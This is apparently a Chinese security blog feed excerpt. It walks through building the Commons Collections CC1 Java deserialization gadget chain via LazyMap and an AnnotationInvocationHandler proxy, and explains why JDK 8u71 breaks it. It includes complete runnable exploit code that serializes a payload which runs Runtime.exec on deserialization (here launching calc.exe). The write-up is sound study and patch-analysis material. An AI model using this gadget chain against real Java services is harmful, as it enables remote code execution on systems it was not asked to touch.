href="https://godownio.github.io/2024/07/10/cc-chong-qi-zhi-cong-ling-dai-ma-gou-zao-cc1/%EF%BC%8C%E6%88%91%E4%BB%AC%E6%9E%84%E9%80%A0chainedTransformer%E4%BB%A3%E7%A0%81%E5%A6%82%E4%B8%8B%EF%BC%9A">https://godownio.github.io/2024/07/10/cc-chong-qi-zhi-cong-ling-dai-ma-gou-zao-cc1/，我们构造chainedTransformer代码如下：</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="comment">//chainedTransformer1</span></span><br></pre></td></tr></table></figure><p>我们控制factory为chainedTransformer，且设置的map中不存在以chainedTransform为键，即可成功调用chainedTransformer.transform()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);</span><br><span class="line">lazyMap.get(<span class="string">&quot;godown&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713193344329.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713193344329.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240713193344329"></p><h3 id="AnnotationInvocationHandler动态代理"><a href="#AnnotationInvocationHandler动态代理" class="headerlink" title="AnnotationInvocationHandler动态代理"></a>AnnotationInvocationHandler动态代理</h3><p>由于调用到get的方法实在是太多了（所以你能挖出的也很多），官方给出的下一步是在AnnotationInvocationHandler的invoke中调用get方法。</p><p>AnnotationInvocationHandler实现了InvocationHandler接口，并重写了invoke方法，典型的代理类！</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713200033341.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713200033341.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240713200033341"></p><p>利用反射在私有构造函数中把memberValues设为lazymap</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713200252091.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713200252091.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240713200252091"></p><p>get的参数member是代理对象调用的方法名，无所谓，不可能是chainedTransformer<img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713200606754.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713200606754.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240713200606754"></p><p>那我们应该选择哪个被代理类呢？</p><p>在get前的代码，如果调用的方法名为equals，toString，hashCode，annotaionType中的任意一个方法都会立刻return，且<code>assert paramTypes.length == 0;</code>表示<code>paramType.length != 0</code>则抛出AssertionError异常。即不能调用有参方法。只要不是调用以上名字方法，都能成功执行。</p><p>代理类只能代理构造函数传入的类，在这里就是继承了Annotation接口的类（即注解），和实现了Map接口的类。</p><p>所以哪个注解类或实现了Map接口的类在readObject调用了无参方法呢？就是他本身</p><p>AnnotationInvocationHandler本身的readObject里调用了map的一个无参方法</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713230626575.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713230626575.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240713230626575"></p><p>我们用AnnotationInvocationHandler代理lazyMap，调用这个代理实例的entrySet方法，就能跳转到invoke方法，进而调用get。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);</span><br><span class="line">Class&lt;?&gt; annotationInvocationHandlerClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">Constructor&lt;?&gt; annotationInvocationHandlerConstructor =annotationInvocationHandlerClass.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">annotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">ProxyInvocationHandler</span> <span class="operator">=</span> (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Override.class,lazyMap);</span><br><span class="line"><span class="type">Map</span> <span class="variable">ProxylazyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,ProxyInvocationHandler);</span><br><span class="line">ProxylazyMap.entrySet();</span><br></pre></td></tr></table></figure><p>我们用AnnotationInvocationHandler#readObject去触发entrySet()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">        <span class="type">Map</span> <span class="variable">ProxylazyMap1</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,ProxyInvocationHandler);</span><br><span class="line"><span class="comment">//        ProxylazyMap.entrySet();</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">ProxylazyMap2</span> <span class="operator">=</span> annotationInvocationHandlerConstructor.newInstance(Override.class,ProxylazyMap1);</span><br><span class="line">        serialize(ProxylazyMap2);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713233221047.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713233221047.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240713233221047"></p><p>完整代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1LazyMap</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);</span><br><span class="line">        Class&lt;?&gt; annotationInvocationHandlerClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; annotationInvocationHandlerConstructor =annotationInvocationHandlerClass.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">ProxyInvocationHandler</span> <span class="operator">=</span> (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Override.class,lazyMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">ProxylazyMap1</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,ProxyInvocationHandler);</span><br><span class="line"><span class="comment">//        ProxylazyMap1.entrySet();</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">ProxylazyMap2</span> <span class="operator">=</span> annotationInvocationHandlerConstructor.newInstance(Override.class,ProxylazyMap1);</span><br><span class="line">        serialize(ProxylazyMap2);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.<span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.FileOutputStream(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        java.io.<span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ObjectOutputStream(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.<span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.FileInputStream(Filename);</span><br><span class="line">        java.io.<span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ObjectInputStream(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用链如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-&gt;AnnotationInvocationHandler.readObject()</span><br><span class="line">      -&gt;ProxyLaztMap.entrySet()</span><br><span class="line">          -&gt;AnnotationInvocationHandler.invoke()</span><br><span class="line">            -&gt;LazyMap.get()</span><br><span class="line">                -&gt;ChainedTransformer.transform()</span><br><span class="line">                -&gt;ConstantTransformer.transform()</span><br><span class="line">                    -&gt;InvokerTransformer.transform()</span><br></pre></td></tr></table></figure><p>其实到AnnotationInvocationHandler.invoke()了，随便找一个类，readObject里含有调用map无参方法。都能完成本条链，或者另外找地方触发LazyMap.get()，毕竟调用get的地方那么多。</p><p>后面我们确实也能看到，由于AnnotationInvocationHandler是属于sun.reflect.annotation包，在8u71版本对该类进行了修改。</p><h3 id="8u71中对AnnotationInvocationHandler-readObject的修复"><a href="#8u71中对AnnotationInvocationHandler-readObject的修复" class="headerlink" title="8u71中对AnnotationInvocationHandler#readObject的修复"></a>8u71中对AnnotationInvocationHandler#readObject的修复</h3><p>这部分有一点绕，我们逐步分析。正是因为过于难理解，才是全网没几个人分析的原因吧。可跳过</p><p>偷懒8u71sun包链接<a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/archive/tip.zip">https://hg.openjdk.org/jdk8u/jdk8u/jdk/archive/tip.zip</a></p><p>我们同样的代码在jdk8u71下会报Override missing element entrySet错误，且不弹计算器。其实报错，LayzMap链失效，TransformedMap链失效，是三个不同的问题。</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240714235448070.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240714235448070.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240714235448070"></p><p>我们diff一下8u71和8u65的AnnotationInvocationHandler的区别</p><p>发现readObject从默认的defaultReadObject变成了readFields()。有的人以为这里就是修复了。实则这两个没区别。</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240716104945152.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240716104945152.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240716104945152"></p><p>在调用 s.readFields() 时，ObjectInputStream 实际上就已经开始读取并解析输入流中的数据，将对象的字段状态反序列化。这个方法会读取所有序列化的字段，并将它们存储在一个 GetField 对象中。GetField 对象充当了一个映射表，其中包含了所有可序列化字段的名称及其对应的值。<br>当你随后调用 fields.get(“fieldName”, defaultValue) 来获取某个字段的值时，实际上是从之前已经反序列化并存储在 GetField 对象中的数据中检索这个值。也就是说，反序列化的过程发生在 readFields() 被调用时，而不是在每次 get 方法调用时。跟之前版本的s.defaultReadObject();没区别</p><p>经过我调试了一天，他妈的。什么输出中间代理实例来diff，到处断点。我还是没有深刻理解到反序列化的过程。</p><blockquote><p>我他妈问个傻逼GPT，问他defaultReadObject会不会自动调用对象下涉及到的其他对象的readObject，他他妈的一口咬死说不会。经典不会涉及。</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240716143253491.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240716143253491.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240716143253491"></p><p>我记得和我脑子里记得不太一样啊，什么readObject链式调用之类的。结果搜集各个资料，回忆涌上心头。</p><p>加入对象A包含对象B和C，且B和C都实现了serializable接口，就会自动调用B和C的readObject，不然defaultReadObject反序列化所有字段怎么处理的？他要反序列化他就得触发readObject。真他妈傻逼啊GPT。</p></blockquote><p>知道这个下面就很容易理解了。</p><p>我们发现官方在AnnotationInvocationHandler#readObject里把调用返回值传到UnsafeAccessor</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240714235314083.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240714235314083.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="关键图1"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240714230029547.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240714230029547.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240714230029547"></p><p>而UnsafeAccessor的setMemverValues和setType是通过UnSafe对象（学过URLDNS链的同学比较熟悉）直接操作内存，将”memberValues”对象的内存拷贝到指定对象”o”的”memberValuesOffset”偏移位置上。简单来说就是修改对象o的对应字段值。</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240714234946309.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240714234946309.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240714234946309"></p><p>无论是defaultReadObject()还是readFields()，都会自动调用serializable序列化流涉及对象的readObject。</p><p>反序列化到代码1的部分时，调用AnnotationInvocationHandler#readObject，此时的streamVals还只是lazyMap，而不是代理实例。而用新建的LinkedHashMap()替换了这个lazyMap。等到代码2调用代理实例的invoke方法时，memberValues已经是LinkedHashMap()了，当然无法跳转到LazyMap.get()。二次触发了readObejct。</p><p>在反序列化过程中修改字段值，这就是这里用Unsafe读取内存修改的原因。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//代码1</span></span><br><span class="line">Class&lt;?&gt; annotationInvocationHandlerClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; annotationInvocationHandlerConstructor =annotationInvocationHandlerClass.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">annotationInvocationHandler</span> <span class="operator">=</span> (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Override.class,lazyMap);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//代码2</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">ProxylazyMap1</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,annotationInvocationHandler);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">ProxylazyMap2</span> <span class="operator">=</span> annotationInvocationHandlerConstructor.newInstance(Override.class,ProxylazyMap1);</span><br><span class="line">        serialize(ProxylazyMap2);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240716144006381.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240716144006381.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240716144006381"></p><p>调试也能看出来：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240716144746103.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240716144746103.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240716144746103"></p><p>有同学可能会问：欸，之前构造的时候，其他类的readObject不会影响我们的链吗？</p><p>不会，因为Proxy、LazyMap之类的都没有readObject，用的默认的，TransformedMap也是调用默认的defaultReadObejct</p><p>至于针对TransformedMap链的修复，是去掉了setValue方法：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240716145205099.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240716145205099.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240716145205099"></p><p>那上面的Override missing element entrySet错误是什么情况？</p><p>这是因为下面红框这句，在TransformedMap链里我们为了走进if，把name置为”value”，并且选了有value方法的Target注解才没有报错，而后面我们只需要走进entrySet就触发的LazyMap链，name就没管了。这里取出的name是entrySet，Override取不到entrySet方法，所以报的错。</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240716145428601.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240716145428601.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240716145428601"></p><p>寄！TransformedMap和LazyMap的CC1都不能用了。</p><p>有任何问题联系我。</p><p>参考链接：</p><p><a href="https://www.cnblogs.com/gonjan-blog/p/6685611.html">https://www.cnblogs.com/gonjan-blog/p/6685611.html</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> CC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CC重启之从零代码构造TransformedMap CC1</title>
      <link href="/2024/07/10/cc-chong-qi-zhi-cong-ling-dai-ma-gou-zao-cc1/"/>
      <url>/2024/07/10/cc-chong-qi-zhi-cong-ling-dai-ma-gou-zao-cc1/</url>
      
        <content type="html"><![CDATA[<p>在此快速重温一遍Java反序列化知识</p><h2 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h2><blockquote><ul><li><p>Constructor类型存储getConstructor获取的有参或无参构造函数。其中getConstructor参数为需要获取的构造函数形参类型，如String.class，Class[].class</p></li><li><p>newInstance实例化对象，可从原型实例化对象，如person.getClass().newInstance()</p></li></ul><p>当然这种实例化只能调用无参构造函数实例化。可以先获取构造器，再调用有参构造函数实例化，如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> person.getClass();</span><br><span class="line">&gt;<span class="type">Constructor</span> <span class="variable">personconstructor</span> <span class="operator">=</span> c.getConstructor(String.Class,<span class="type">int</span>.class);</span><br><span class="line">&gt;<span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> (Person) personconstructor.newInstance(<span class="string">&quot;abc&quot;</span>,<span class="number">21</span>);</span><br></pre></td></tr></table></figure><ul><li>Field存储类里的属性。如</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;Field[] personfields = c.getDeclaredFields();</span><br><span class="line">&gt;<span class="keyword">for</span>(Field f:personfields)&#123;</span><br><span class="line">  ...</span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure><ul><li>Method存储获取的类方法。getMethod()获取类方法</li><li>invoke执行获取的method方法</li></ul><p>以上方法加declared获取私有内容，如getDecalredFields()获取私有属性</p><p>使用setAccessible(true)允许修改私有变量，私有方法等private内容</p></blockquote><p>以上内容不着急理解，接着往下看</p><p>反序列化需要从能invoke执行代码的部分走到readObject，序列化时导致任意代码执行。</p><p>比如Runtime类下的exec方法就能执行系统命令，我们通常使用单形参的这个exec：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240705214001199.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240705214001199.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" 